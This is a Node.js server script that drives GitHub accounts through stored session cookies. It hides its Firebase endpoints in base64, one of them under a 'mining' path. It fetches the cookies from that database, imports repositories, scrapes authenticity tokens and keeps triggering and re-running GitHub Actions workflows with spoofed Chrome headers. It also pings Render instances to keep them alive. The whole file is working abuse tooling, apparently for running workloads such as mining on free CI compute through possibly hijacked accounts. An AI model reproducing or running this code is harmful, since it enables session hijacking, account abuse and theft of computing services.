const FormData = require('form-data')
const express = require('express')
const axios = require('axios')

const SERVER = 2
const LIVE = 150

let mLogMessage = []
let mActiveServer = []
let mUpdateServer = {}
let mID = null

let mUpdate = new Date().getTime()
let mStart = parseInt(mUpdate/1000)
let mTime = new Date().toString()

let BASE_URL = decode('aHR0cHM6Ly9qb2Itc2VydmVyLTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')
let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')

const app = express()

app.use(express.json())

app.listen(process.env.PORT || 3000, ()=>{
    consoleLog('Listening on port 3000')
})

app.get('/', async (req, res) => {
    if (mID == null) {
        try {
            let url = req.query.url
            if (!url) {
                let host = req.hostname
                if (host.endsWith('onrender.com')) {
                    url = host.replace('.onrender.com', '')
                }
            }
    
            if (url && url != 'localhost') {
                mID = url
            }
        } catch (error) {}
    }

    res.end(''+mStart)
})

app.get('/start', async (req, res) => {
    res.end(''+mTime)
})

app.get('/log', async (req, res) => {
    let msg = ''

    try {
        for (let i = 0; i < mLogMessage.length; i++) {
            try {
                msg += mLogMessage[i]+'\n'
            } catch (error) {}
        }
    } catch (error) {}

    res.end(''+msg)
})


startServer()


async function startServer() {

    await updateRender()

    if (SERVER == 1) {
        await createRepo()
    }

    await updateServer(true)

    while (true) {
        for (let i = 0; i < 3; i++) {
            await delay(60000)
            await updateStatus()
        }
        await updateServer(false)
        if (SERVER == 1) {
            await updateRender()
            await createRepo()
        }
    }
}

async function updateRender() {
    try {
        let response = await axios.get(BASE_URL+'mining/live/server.json', { timeout:10000 })

        let data = response.data
        if (data != null && data != 'null') {
            await axios.get('https://'+data+'.onrender.com', { timeout:10000 })
        }
    } catch (error) {}
}

async function updateStatus() {
    if (mID) {
        try {
            await axios.get('https://'+mID+'.onrender.com', { timeout:10000 })       
        } catch (error) {}
    }
}

async function createRepo() {
    try {
        let response = await axios.get(BASE_URL+'github/new.json?orderBy=%22$key%22&limitToFirst=5', { timeout:10000 })

        let data = response.data

        if (data != null && data != 'null') {
            let load = 0
            let length = Object.keys(data).length
            let devide = 150000/length

            consoleLog('Create Repo:', length)

            for (let [repo, user] of Object.entries(data)) {
                importRepo(load+1, repo, user, load*devide)
                load++
            }
        }
    } catch (error) {}

    try {
        let response = await axios.get(BASE_URL+'github/start.json?orderBy=%22active%22&startAt=1&limitToFirst=5', { timeout:10000 })

        let data = response.data

        if (data != null && data != 'null') {
            let list = {}
            
            for (let [repo, value] of Object.entries(data)) {
                try {
                    let active = value['active']
                    if (active > 0 && active < parseInt(new Date().getTime()/1000)) {
                        list[repo] = value['user']
                    }
                } catch (error) {}
            }

            let load = 0
            let length = Object.keys(list).length
            let devide = 150000/length

            consoleLog('Create New Action:', length)

            for (let [repo, user] of Object.entries(list)) {
                startNewAction(load+1, user, repo, load*devide)
                load++
            }
        }
    } catch (error) {}
}

async function importRepo(id, repo, user, timeout) {
    setTimeout(async() => {
        try {
            let response = await axios.get(BASE_URL+'github/server/'+user+'.json', { timeout:10000 })
            let data = response.data

            if(data != null && data != 'null') {
                
                let form = new FormData()
                form.append('vcs_url', 'https://github.com/'+user+'/'+user)
                form.append('owner', user)
                form.append('repository[name]', repo)
                form.append('repository[visibility]', 'public')
                form.append('source_username', '')
                form.append('source_access_token', '')

                response = await axios.post('https://github.com/new/import', form, {
                    headers: {
                        'accept': 'text/html',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-type': form.getHeaders()['content-type'],
                        'cookie': 'user_session='+data['cookies']+'; __Host-user_session_same_site='+data['cookies']+'; has_recent_activity=1; logged_in=yes; preferred_color_mode=dark;',
                        'github-verified-fetch': 'true',
                        'origin': 'https://github.com',
                        'priority': 'u=1, i',
                        'referer': 'https://github.com/new/import',
                        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
                        'x-requested-with': 'XMLHttpRequest'
                    },
                    maxRedirects: 0,
                    validateStatus: null,
                    timeout:10000
                })
                
                try {
                    let active = 0

                    if (response.status == 302 || response.data == '') {
                        consoleLog(id, 'Create Success: '+user+'/'+repo)
                        active = parseInt(new Date().getTime()/1000)+200

                        try {
                            await axios.patch(BASE_URL+'github/server/'+user+'/repo.json', '{"'+repo+'":"1"}', {
                                headers: {
                                    'Content-Type': 'application/x-www-form-urlencoded'
                                },
                                timeout:10000
                            })
                        } catch (error) {}
                    } else {
                        consoleLog(id, 'Create Failed: '+user+'/'+repo)
                    }

                    try {
                        await axios.patch(BASE_URL+'github/start/'+repo+'.json', JSON.stringify({ user:user, active:active }), {
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            },
                            timeout:10000
                        })
                    } catch (error) {}
                } catch (error) {}
                
                await axios.delete(BASE_URL+'github/new/'+repo+'.json', { timeout:10000 })
            }
        } catch (error) {}
    }, timeout)
}

async function startNewAction(id, user, repo, timeout) {
    setTimeout(async() => {
        try {
            let response = await axios.get(BASE_URL+'github/server/'+user+'.json', { timeout:10000 })
            let data = response.data

            if(data != null && data != 'null') {
                let cookies = 'user_session='+data['cookies']+'; __Host-user_session_same_site='+data['cookies']+'; has_recent_activity=1; logged_in=yes; preferred_color_mode=dark;'
                let action = await getAction(user, repo, cookies, 1)
                if (action == null) {
                    await newAction(user, repo, cookies)
                    action = await getAction(user, repo, cookies, 5)
                }
                
                if (action) {
                    consoleLog(id, 'Receive New Action: '+action)
                    consoleLog(id, 'Success: '+user+'/'+repo)
                    await saveAction(user, repo, action)

                    await axios.patch(BASE_URL+'github/panding/.json', '{"'+repo+'":"1"}', {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        },
                        timeout:10000
                    })

                    await axios.delete(BASE_URL+'github/start/'+repo+'.json', { timeout:10000 })
                } else {
                    consoleLog(id, 'Action Null: '+user+'/'+repo)
                }
            }
        } catch (error) {}
    }, timeout)
}

async function updateServer(firstTime) {
    try {
        if (mActiveServer.length == 0 || mUpdate < new Date().getTime()) {
            let response = await axios.get(BASE_URL+'github/update/'+getServerName(SERVER)+'.json', { timeout:10000 })

            try {
                let temp = []

                for(let key of Object.keys(response.data)) {
                    if (key != null) {
                        temp.push(key)
                    }
                }

                mActiveServer = temp
                mUpdate = new Date().getTime()+3600000
            } catch (error) {}
        }
        
        let size = mActiveServer.length

        if (firstTime) {
            consoleLog('All:', size, 'Load: All')
            
            for (let i = 0; i < size; i++) {
                await readLiveUpdate(mActiveServer[i])
            }
        }

        let mList = Object.keys(mUpdateServer).sort(function(a,b) { return mUpdateServer[a] - mUpdateServer[b] })
        
        let length = mList.length > 20 ? 20 : mList.length

        consoleLog('All:', size, 'Update:', length)

        if (length > 0) {
            for (let i = 0; i < length; i++) {
                updateWebsite(i+1, mList[i], i*8000)
            }
        }

        if (size > 0) {
            let devide = 160000/size

            for (let i = 0; i < size; i++) {
                receiveUpdate(mActiveServer[i], i*devide)
            }
        }

        if (size < LIVE) {
            try {
                let response = await axios.get(BASE_URL+'github/panding.json?orderBy=%22$key%22&limitToFirst='+(LIVE-size), { timeout:10000 })

                let data = response.data

                if (data != null && data != 'null') {

                    for (let key of Object.keys(data)) {
                        try {
                            await axios.patch(BASE_URL+'github/update/'+getServerName(SERVER)+'.json', '{"'+key+'":"1"}', {
                                headers: {
                                    'Content-Type': 'application/x-www-form-urlencoded'
                                },
                                timeout:10000
                            })

                            await axios.delete(BASE_URL+'github/panding/'+key+'.json', { timeout:10000 })
                        } catch (error) {}

                        mUpdate = new Date().getTime()
                    }
                }
            } catch (error) {}
        }
    } catch (error) {}
}
   
async function receiveUpdate(repo, timeout) {
    setTimeout(async() => {
        await readLiveUpdate(repo)
    }, timeout)
}

async function readLiveUpdate(repo) {
    try {
        let response = await axios.get(STORAGE+encodeURIComponent('server/'+repo+'.json'), { timeout:10000 })
        
        if (parseInt(new Date().getTime()/1000) > parseInt(response.data['contentType'].replace('active/', ''))+10) {
            let pervData = mUpdateServer[repo]

            if (pervData != null) {
                mUpdateServer[repo] = pervData+1
            } else {
                mUpdateServer[repo] = 1
            }
        }
    } catch (error) {}
}

async function updateWebsite(id, repo, timeout) {
    setTimeout(async() => {
        try {
            let storageUrl = STORAGE+encodeURIComponent('server/'+repo+'.json')
            let response = await axios.get(BASE_URL+'github/action/'+repo+'.json', { timeout:10000 })
                
            let data = response.data

            if(data != null && data != 'null') {
                let action = data['action']
                let user = data['user']

                response = await axios.get(BASE_URL+'github/server/'+user+'.json', { timeout:10000 })
            
                data = response.data

                if(data != null && data != 'null') {
                    await activeAction(id, user, repo, action, storageUrl, 'user_session='+data['cookies']+'; __Host-user_session_same_site='+data['cookies']+'; has_recent_activity=1; logged_in=yes; preferred_color_mode=dark;')
                } else {
                    consoleLog(id, 'User Not Found: '+user)
                    await axios.delete(storageUrl, { timeout:10000 })
                }
            } else {
                consoleLog(id, 'Repo Not Found: '+repo)
                await axios.delete(storageUrl, { timeout:10000 })
            }
        } catch (error) {}
    }, timeout)
}

async function activeAction(id, user, repo, action, storageUrl, cookies) {
    let token = null

    try {
        let response = await axios.get('https://github.com/'+user+'/'+repo+'/actions/runs/'+action, { 
            headers: getFrameHeader(cookies),
            maxRedirects: 0,
            validateStatus: null,
            timeout:10000
        })

        let body = response.data

        if (body.includes('Failure') || body.includes('Cancelled') || body.includes('Success')) {
            if (body.includes('rerequest_check_suite') && body.includes('id="rerun-dialog-mobile-all"')) {
                body = body.substring(body.indexOf('id="rerun-dialog-mobile-all"'), body.length)
                body = body.substring(0, body.indexOf('</dialog>'))
                body = body.substring(body.indexOf('rerequest_check_suite'), body.length)
                
                let name = 'name="authenticity_token"'
                if (body.includes(name)) {
                    let index = body.indexOf(name)+name.length
                    let _token = body.substring(index, index+200).split('"')[1]
                    if (_token && _token.length > 10) {
                        token = _token
                    }
                }
            } else if (!body.includes('aria-label="currently running: "') && !body.includes('aria-label="queued: "') && body.includes('Jump to attempt')) {
                let action = await getAction(user, repo, cookies, 1)
                if (action == null) {
                    await newAction(user, repo, cookies)
                    action = await getAction(user, repo, cookies, 5)
                }
                if (action) {
                    token = 'action'
                    consoleLog(id, 'Receive New Action: '+action)
                    consoleLog(id, 'Success: '+user+'/'+repo)
                    await saveAction(user, repo, action)

                    delete mUpdateServer[repo]
                } else {
                    consoleLog(id, 'Action Null: '+user+'/'+repo)
                }
            }

            if (token && token != 'action') {
                let response = await axios.post('https://github.com/'+user+'/'+repo+'/actions/runs/'+action+'/rerequest_check_suite',
                    new URLSearchParams({
                        '_method': 'put',
                        'authenticity_token': token
                    }),
                {
                    headers: getGrapHeader(cookies),
                    maxRedirects: 0,
                    validateStatus: null,
                    timeout:10000
                })

                delete mUpdateServer[repo]
        
                try {
                    if (response.data.length > 0) {
                        consoleLog(id, 'Block: '+user+'/'+repo)
                    } else {
                        consoleLog(id, 'Success: '+user+'/'+repo)
                    }
        
                    await axios.post(storageUrl, '', {
                        headers: {
                            'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+200)
                        },
                        maxBodyLength: Infinity,
                        maxContentLength: Infinity,
                        timeout:10000
                    })
                } catch (error) {
                    consoleLog(id, 'Error: '+user+'/'+repo)
                }
            }
        } else if (body.includes('aria-label="currently running: "') || body.includes('aria-label="queued: "')) {
            token = 'runing'

            if (body.includes('aria-label="queued: "')) {
                consoleLog(id, 'Panding: '+user+'/'+repo)
            } else {
                consoleLog(id, 'Runing: '+user+'/'+repo)
            }

            try {
                await axios.post(storageUrl, '', {
                    headers: {
                        'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+200)
                    },
                    maxBodyLength: Infinity,
                    maxContentLength: Infinity,
                    timeout:10000
                })
            } catch (error) {}
            
            delete mUpdateServer[repo]
        }
    } catch (error) {}

    if (token == null) {
        consoleLog(id, 'Token Null: '+user+'/'+repo)

        try {
            await axios.get('https://raw.githubusercontent.com/'+user+'/'+repo+'/main/.github/workflows/main.yml', { timeout:10000 })
        } catch (error) {
            try {
                if (error.response.data == '404: Not Found') {
                    consoleLog(id, 'Remove Data: '+user+'/'+repo)
                    try {
                        await axios.delete(storageUrl, { timeout:10000 })
                    } catch (error) {}

                    try {
                        await axios.delete(BASE_URL+'github/update/'+getServerName(SERVER)+'/'+repo+'.json', { timeout:10000 })
                    } catch (error) {}

                    try {
                        await axios.delete(BASE_URL+'github/action/'+repo+'.json', { timeout:10000 })
                    } catch (error) {}

                    mUpdate = new Date().getTime()

                    delete mUpdateServer[repo]
                }
            } catch (error) {}
        }
    }
}

async function newAction(user, repo, cookies) {
    let token = null

    try {
        let response = await axios.get('https://github.com/'+user+'/'+repo+'/actions/manual?workflow=.github%2Fworkflows%2Fmain.yml', { 
            headers: getFrameHeader(cookies),
            maxRedirects: 0,
            validateStatus: null,
            timeout:10000
        })

        let body = response.data

        let name = 'name="authenticity_token"'
        if (body.includes(name)) {
            let index = body.indexOf(name)+name.length
            let _token = body.substring(index, index+200).split('"')[1]
            if (_token && _token.length > 10) {
                token = _token
            }
        }

        if (token) {
            await axios.post('https://github.com/'+user+'/'+repo+'/actions/manual',
                new URLSearchParams({
                    'authenticity_token': token,
                    'workflow': '.github/workflows/main.yml',
                    'branch': 'main',
                    'show_workflow_tip': ''
                }),
                {
                    headers: getGrapHeader(cookies),
                    maxRedirects: 0,
                    validateStatus: null,
                    timeout:10000
                })
            
            await delay(3000)
        }
    } catch (error) {}
}

async function getAction(user, repo, cookies, loop) {
    let action = null

    for (let i = 0; i < loop; i++) {
        try {
            let response = await axios.get('https://github.com/'+user+'/'+repo+'/actions', { 
                headers: getFrameHeader(cookies),
                maxRedirects: 0,
                validateStatus: null,
                timeout:10000
            })

            let body = response.data

            if (body.includes('aria-label="currently running: "')) {
                let temp = body.substring(0, body.indexOf('aria-label="currently running: "'))
                temp = temp.substring(temp.lastIndexOf('Box-row js-socket-channel js-updatable-content'))
                temp = temp.substring(temp.indexOf('/actions/runs/'))
                action = temp.substring(14, temp.indexOf('"'))
            } else if (body.includes('aria-label="queued: "')) {
                let temp = body.substring(0, body.indexOf('aria-label="queued: "'))
                temp = temp.substring(temp.lastIndexOf('Box-row js-socket-channel js-updatable-content'))
                temp = temp.substring(temp.indexOf('/actions/runs/'))
                action = temp.substring(14, temp.indexOf('"'))
            }
        } catch (error) {}

        if (action) {
            break
        }

        await delay(2000)
    }

    return action
}

async function saveAction(user, repo, action) {
    try {
        await axios.patch(BASE_URL+'github/action/'+repo+'.json', JSON.stringify({ action:action, user:user }), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            timeout:10000
        })
    } catch (error) {}
}

function getFrameHeader(cookies) {
    return {
        'authority': 'github.com',
        'accept': 'text/html, application/xhtml+xml',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': cookies,
        'sec-ch-ua': '"Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'turbo-frame': 'repo-content-turbo-frame',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
    }
}

function getGrapHeader(cookies) {
    return {
        'authority': 'github.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'cookie': cookies,
        'origin': 'https://github.com',
        'sec-ch-ua': '"Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
    }
}

function getServerName(id) {
    if (id < 10) {
        return 'server0'+id
    }
    return 'server'+id
}

function consoleLog(parm1, parm2, parm3, parm4, parm5) {
    try {
        let msg = null
        if(parm5 != undefined) {
            msg = parm1+' '+parm2+' '+parm3+' '+parm4+' '+parm5
            console.log(parm1, parm2, parm3, parm4, parm5)
        } else if(parm4 != undefined) {
            msg = parm1+' '+parm2+' '+parm3+' '+parm4
            console.log(parm1, parm2, parm3, parm4)
        } else if(parm3 != undefined) {
            msg = parm1+' '+parm2+' '+parm3
            console.log(parm1, parm2, parm3)
        } else if(parm2 != undefined) {
            msg = parm1+' '+parm2
            console.log(parm1, parm2)
        } else if (parm1 != undefined) {
            msg = parm1
            console.log(parm1)
        }

        if (msg != null) {
            mLogMessage.push(new Date().toLocaleTimeString('en-us', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(',', '')+' :\t'+msg)

            try {
                let target = 100
                if (mLogMessage.length > target) {
                    for (let i = 0; i < mLogMessage.length - target; i++) {
                        mLogMessage.shift()
                    }
                }
            } catch (error) {}
        }
    } catch (error) {}
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
